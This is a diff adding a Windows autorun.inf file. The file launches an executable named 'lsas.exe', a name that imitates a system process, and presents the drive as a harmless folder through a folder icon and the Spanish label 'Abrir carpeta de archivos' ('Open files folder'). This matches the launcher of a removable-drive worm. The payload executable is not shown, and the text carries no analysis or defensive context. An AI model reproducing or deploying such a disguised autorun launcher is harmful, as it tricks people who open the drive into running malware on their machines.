@@ -1,0 +1,7 @@
+[autorun]
+open=lsas.exe
+icon=systemroot%\system32\shell32.dll,7
+action=Abrir carpeta de archivos
+shell\open=Open
+shell\open\command=lsas.exe
+shell\open\default=1
